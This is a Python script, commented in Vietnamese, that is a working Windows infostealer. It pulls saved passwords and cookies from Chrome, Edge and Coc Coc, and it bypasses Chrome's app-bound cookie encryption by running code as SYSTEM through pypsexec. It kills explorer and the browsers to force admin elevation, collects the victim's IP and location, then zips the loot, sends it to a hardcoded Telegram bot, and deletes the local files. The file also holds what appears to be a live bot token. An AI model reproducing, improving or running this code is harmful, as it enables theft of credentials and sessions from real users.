
BOT_TOKEN='8067268503:AAEVnnWe73BZdrqBpt2ME-txBO2mOqlh3sM'
CHAT_ID='-4546531615'

import ctypes
import os
import sys
import json
import binascii
import sqlite3
import pathlib
from Crypto.Cipher import AES
from pypsexec.client import Client
import time
import base64
import win32crypt
import shutil
import subprocess
import zipfile
import requests
THUMUCGOC = "DataSystem"
EDGE_PATH = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
CHROME_PATH = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
COCOC_PATH = r"C:\Program Files\CocCoc\Browser\Application\browser.exe"
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
COCCOC_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\CocCoc\Browser\User Data\Local State"%(os.environ['USERPROFILE']))
EDGE_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State"%(os.environ['USERPROFILE']))
slprofile = 0
slpass = 0

def nen(folder_path, zip_name):
    # Tạo file zip mới
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        # Duyệt qua tất cả các file và thư mục trong thư mục
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                # Đường dẫn đầy đủ tới file
                file_path = os.path.join(root, file)
                # Đường dẫn của file trong archive zip (bỏ phần thư mục gốc)
                arcname = os.path.relpath(file_path, folder_path)
                # Thêm file vào archive zip
                zipf.write(file_path, arcname)

def send(bot_token, chat_id, file_path, caption=None):
    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
    
    with open(file_path, 'rb') as file:
        response = requests.post(url, data={'chat_id': chat_id, 'caption': caption or ''}, files={'document': file})
    
    if response.ok:
        print('Tệp tin đã được gửi thành công!')
        return True
    print(f'Lỗi: {response.text}')
    return False
def get_edge_profile():
    user_profile = os.environ['USERPROFILE']
    # Đường dẫn cho các profile của CocCoc và Edge
    edge_local_state_path = rf"{user_profile}\AppData\Local\CocCoc\Browser\User Data"
    edge_nx_local_state_path = rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data"  # Thêm đường dẫn mới cho Edge NX
    profile_paths = []

    if os.path.exists(edge_local_state_path):
        profile_paths.append(os.path.join(edge_local_state_path, 'Default'))
    if os.path.exists(edge_nx_local_state_path):  # Kiểm tra nếu thư mục của Edge NX tồn tại
        profile_paths.append(os.path.join(edge_nx_local_state_path, 'Default'))

    return profile_paths


def get_profile():
    # Lấy đường dẫn thư mục người dùng
    user_profile = os.environ['USERPROFILE']
    
    # Đường dẫn tới thư mục dữ liệu của các trình duyệt
    chrome_local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data"

    
    profile_paths = []

    # Kiểm tra thư mục dữ liệu của Google Chrome
    if os.path.exists(chrome_local_state_path):
        profiles = [f for f in os.listdir(chrome_local_state_path) 
                    if os.path.isdir(os.path.join(chrome_local_state_path, f)) and f.startswith("Profile")]
        profile_paths.extend([os.path.join(chrome_local_state_path, profile) for profile in profiles])
        profile_paths.append(os.path.join(chrome_local_state_path, 'Default'))
    
  
    
    return profile_paths
def decrypt_cookie_v20(encrypted_value, key):
    cookie_iv = encrypted_value[3:3+12]
    encrypted_cookie = encrypted_value[3+12:-16]
    cookie_tag = encrypted_value[-16:]
    cookie_cipher = AES.new(key, AES.MODE_GCM, nonce=cookie_iv)
    decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
    return decrypted_cookie[32:].decode('utf-8')
def get_secret_key(path):
    try:
        #(1) Get secretkey from chrome local state
        with open( path, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] secretkey cannot be found")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        #(3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        #Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        #(4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""
def cookie_ec():
    for profile in get_edge_profile():
        while True:
            try:
                cookies_string =""
                print('Checking cookies in: ', profile)
                pathdata = os.path.join(THUMUCGOC)
                user_profile = os.environ['USERPROFILE']
                if(os.path.basename(os.path.dirname(os.path.dirname(os.path.dirname(profile)))) == 'CocCoc'):
                    local_state_path = rf"{user_profile}\AppData\Local\CocCoc\Browser\User Data\Local State"
                else:
                    local_state_path = rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data\Local State"
                cookie_db_path = os.path.join(profile, "Network", "Cookies")
                
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = json.load(f)
                app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
                arguments = "-c \"" + """import win32crypt
                import binascii
                encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
                print(binascii.b2a_base64(encrypted_key[1]).decode())
                """.replace("\n", ";") + "\""
                
                c = Client("localhost")
                c.connect()
                
                try:
                    c.create_service()
                    app_bound_encrypted_key_b64 = binascii.b2a_base64(binascii.a2b_base64(app_bound_encrypted_key)[4:]).decode().strip()
                    encrypted_key_b64, stderr, rc = c.run_executable(
                        sys.executable,
                        arguments=arguments.format(app_bound_encrypted_key_b64),
                        use_system_account=True
                    )
                    decrypted_key_b64, stderr, rc = c.run_executable(
                        sys.executable,
                        arguments=arguments.format(encrypted_key_b64.decode().strip()),
                        use_system_account=False
                    )
                    decrypted_key = binascii.a2b_base64(decrypted_key_b64)[-32:]
                finally:
                    c.remove_service()
                    c.disconnect()

                con = sqlite3.connect(f"file:///{cookie_db_path}?mode=ro", uri=True)
                cur = con.cursor()
                r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB), path, is_secure, is_httponly, expires_utc from cookies;")
                cookies = cur.fetchall()
                cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
                con.close()
                
                for c in cookies_v20:
                    secure_flag = "TRUE" if c[4] == 1 else "FALSE"
                    httponly_flag = "TRUE" if c[5] == 1 else "FALSE"
                    try:
                        cookies_string += f"{c[0]}\t{secure_flag}\t/\t{httponly_flag}\t{c[6]}\t{c[1]}\t{decrypt_cookie_v20(c[2], decrypted_key)}"
                        cookies_string += "\n"
                    except Exception as e:
                        print('Error decrypting: ', str(e))
            
                with open(os.path.join(pathdata, f'cookie_{os.path.basename(os.path.dirname(os.path.dirname(os.path.dirname(profile))))}_{os.path.basename(profile)}.txt'), 'w') as f:
                    f.write(cookies_string)
                break
            except Exception as f:
                print(str(f))
                with open("error_log.txt", "a", encoding="utf-8") as log_file:
                    log_file.write(f"Error: {str(f)}\n\n")
def cookie(slprofile):
    print(get_profile())
    for profile in get_profile():
        try:
            slprofile = slprofile + 1
            print('Số lượng profile:',slprofile)
            print('Check cookie: ',profile)
            pathdata = os.path.join(THUMUCGOC)
            user_profile = os.environ['USERPROFILE']
            local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
            cookie_db_path = os.path.join(profile, "Network","Cookies")
            print(cookie_db_path)
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
            arguments = "-c \"" + """import win32crypt
            import binascii
            encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
            print(binascii.b2a_base64(encrypted_key[1]).decode())
            """.replace("\n", ";") + "\""
            thu = 4
            while True:
                try:
                    cookies_string = ""
                    c = Client("localhost")
                    c.connect()

                    try:
                        c.create_service()
                        assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
                        app_bound_encrypted_key_b64 = binascii.b2a_base64(
                            binascii.a2b_base64(app_bound_encrypted_key)[4:]).decode().strip()
                        # decrypt with SYSTEM DPAPI
                        encrypted_key_b64, stderr, rc = c.run_executable(
                            sys.executable,
                            arguments=arguments.format(app_bound_encrypted_key_b64),
                            use_system_account=True
                        )
                        # decrypt with user DPAPI
                        decrypted_key_b64, stderr, rc = c.run_executable(
                            sys.executable,
                            arguments=arguments.format(encrypted_key_b64.decode().strip()),
                            use_system_account=False
                        )
                        decrypted_key = binascii.a2b_base64(decrypted_key_b64)[-61:]
                        assert(decrypted_key[0] == 1)
                    finally:
                        c.remove_service()
                        c.disconnect()
                    aes_key = binascii.a2b_base64("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
                    iv = decrypted_key[1:1+12]
                    ciphertext = decrypted_key[1+12:1+12+32]
                    tag = decrypted_key[1+12+32:]
                    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
                    key = cipher.decrypt_and_verify(ciphertext, tag)
                    con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
                    cur = con.cursor()
                    r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB), path, is_secure, is_httponly, expires_utc from cookies;")
                    cookies = cur.fetchall()
                    cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
                    con.close()
                    for c in cookies_v20:
                        if(c[4] == 1):
                            secure_flag = "TRUE"
                        else:
                            secure_flag = "FALSE"
                        if(c[5] == 1):
                            httponly_flag = "TRUE"
                        else:
                            httponly_flag = "FALSE"
                        try:
                            cookies_string += f"{c[0]}\t{secure_flag}\t/\t{httponly_flag}\t{c[6]}\t{c[1]}\t{decrypt_cookie_v20(c[2], key)}"
                            cookies_string += "\n"
                        except Exception as e:
                            print('error decrypt: ',str(e))
                    with open(os.path.join(pathdata ,f'cookie_{os.path.basename(os.path.dirname(os.path.dirname(os.path.dirname(profile))))}_{os.path.basename(profile)}.txt'),'w') as f:
                        f.write(cookies_string)
                    break
                except:
                    thu = thu - 1
                    if(thu == 0):
                        break
                
        except Exception as e:
            print(str(e))
            with open("error_log.txt", "a", encoding="utf-8") as log_file:
                log_file.write(f"Error: {str(e)}\n\n")
    return slprofile
def password(slpass):
    for profile in get_profile():
        try:
            if(os.path.basename(os.path.dirname(os.path.dirname(os.path.dirname(profile)))) == 'Google'):
                secret_key = get_secret_key(CHROME_PATH_LOCAL_STATE)
            elif(os.path.basename(os.path.dirname(os.path.dirname(os.path.dirname(profile)))) == 'CocCoc'):
                secret_key = get_secret_key(COCCOC_PATH_LOCAL_STATE)
            else:
                secret_key = get_secret_key(EDGE_PATH_LOCAL_STATE)
            if not secret_key:
                return []    
            password_string= ''
            pathdata = os.path.join(THUMUCGOC)
            
            login_db_path = os.path.join(profile, "Login Data")
            print('check pass: ',login_db_path)
            con = sqlite3.connect(f"file:///{login_db_path}?mode=ro", uri=True)
            cur = con.cursor()
            
            # Truy vấn mật khẩu từ cơ sở dữ liệu
            cur.execute("SELECT action_url, username_value, password_value FROM logins")
            logins = cur.fetchall()
            
            # Giải mã và in mật khẩu
            decrypted_passwords = []
            for login in logins:
                origin_url, username, encrypted_password = login
                decrypted_pass = decrypt_password(encrypted_password, secret_key)
                if not(origin_url == '' or username == ''):
                    decrypted_passwords.append({
                        "origin_url": origin_url,
                        "username": username,
                        "password": decrypted_pass
                    })
            
            con.close()
            for password in decrypted_passwords:
                slpass = slpass + 1
                password_string += f"{password['origin_url']}\t\t{password['username']}\t{password['password']}\n"
            with open(os.path.join(pathdata ,f'password_{os.path.basename(os.path.dirname(os.path.dirname(os.path.dirname(profile))))}_{os.path.basename(profile)}.txt'),'w') as f:
                f.write(password_string)
        except Exception as e:
            with open("error_log.txt", "a", encoding="utf-8") as log_file:
                log_file.write(f"Error: {str(e)}\n\n")
    return slpass
def get_ip_info():
    # Gửi yêu cầu đến dịch vụ ipinfo.io
    response = requests.get('http://ipinfo.io/json')

    if response.status_code == 200:
        data = response.json()
        ip = data.get('ip')
        city = data.get('city')
        country = data.get('country')

        return ip, city, country
    else:
        print("Lỗi khi lấy thông tin IP.")
        return None, None, None
def kill_explorer():
    """Hàm để tắt explorer.exe"""
    try:
        os.system("taskkill /f /im explorer.exe")
        print("Explorer đã bị tắt!")
    except Exception as e:
        print(f"Lỗi khi tắt Explorer: {e}")
def start_explorer():
    """Hàm để khởi động lại explorer.exe"""
    try:
        subprocess.Popen("explorer.exe")
        print("Explorer đã được khởi động lại!")
    except Exception as e:
        print(f"Lỗi khi khởi động Explorer: {e}")
if __name__ == "__main__":
    
    while True:
        if ctypes.windll.shell32.IsUserAnAdmin():
            start_explorer()
            # Nếu đã có quyền admin, thoát khỏi vòng lặp và chạy chương trình
            break
        kill_explorer()
        print("Script cần quyền admin để tiếp tục.")
        # Yêu cầu chạy lại với quyền admin
        result = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 0
        )
        if result <= 32:
            print("Người dùng từ chối quyền admin. Thử lại...")
        else:
            print("Quyền admin đã được cấp.")
            start_explorer()
            sys.exit(0)
    
    if not os.path.exists(THUMUCGOC):
        os.makedirs(THUMUCGOC)
        print(f"Thư mục '{THUMUCGOC}' đã được tạo.")
    else:
        shutil.rmtree(THUMUCGOC)
        os.makedirs(THUMUCGOC)

    processes = ['chrome.exe', 'browser.exe', 'msedge.exe']
    for process in processes:
        try:
            subprocess.run(f'taskkill /f /im {process}', check=True, shell=True)
            print(f'{process} đã được tắt thành công.')
        except subprocess.CalledProcessError:
            print(f'Không thể tắt {process}.')
    print(get_profile())
    cookie_ec()
    sl1 = cookie(slprofile)
    sl2 = password(slpass)
    nen(THUMUCGOC, os.path.join(os.path.basename(os.environ['USERPROFILE'])+'.zip'))
    shutil.rmtree(THUMUCGOC)
    ip, city, country = get_ip_info()
    send(BOT_TOKEN, CHAT_ID, os.path.join(os.path.basename(os.environ['USERPROFILE'])+'.zip'), 'USERNAME: '+os.path.basename(os.environ['USERPROFILE'])+'\nIP: '+str(ip)+'\nCOUNTRY: '+country+'\nCITY: '+city+'\nPASSWORD: '+str(sl2))
    os.remove(os.path.join(os.path.basename(os.environ['USERPROFILE'])+'.zip'))
